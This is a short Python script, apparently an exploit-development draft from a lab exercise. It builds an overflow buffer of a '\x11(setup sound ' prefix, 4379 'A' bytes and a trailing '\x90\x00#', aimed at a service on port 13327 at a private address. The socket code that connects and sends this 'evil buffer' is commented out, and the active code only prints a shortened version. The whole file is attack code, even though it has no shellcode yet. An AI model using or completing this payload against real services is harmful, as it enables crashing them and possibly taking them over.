#!/usr/bin/python3

import socket

host='192.168.56.110'

'''
buffer = b''
buffer += b'\x11(setup sound ' 
buffer += b'A'*4379
buffer += b'\x90\x00#'
'''

a='\x11(setup sound '
b=a.encode()
c='A'*10
d=c.encode()
e='\x90\x00#'
f=e.encode()

print(b+d+f)
'''
buffer += b'A'*4379
buffer += b'\x90\x00#'
'''
'''
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print('Sending evil buffer...')
s.connect((host, 13327))
data=s.recv(1024)
s.send(buffer)
s.close()
print('Payload Sent')
'''

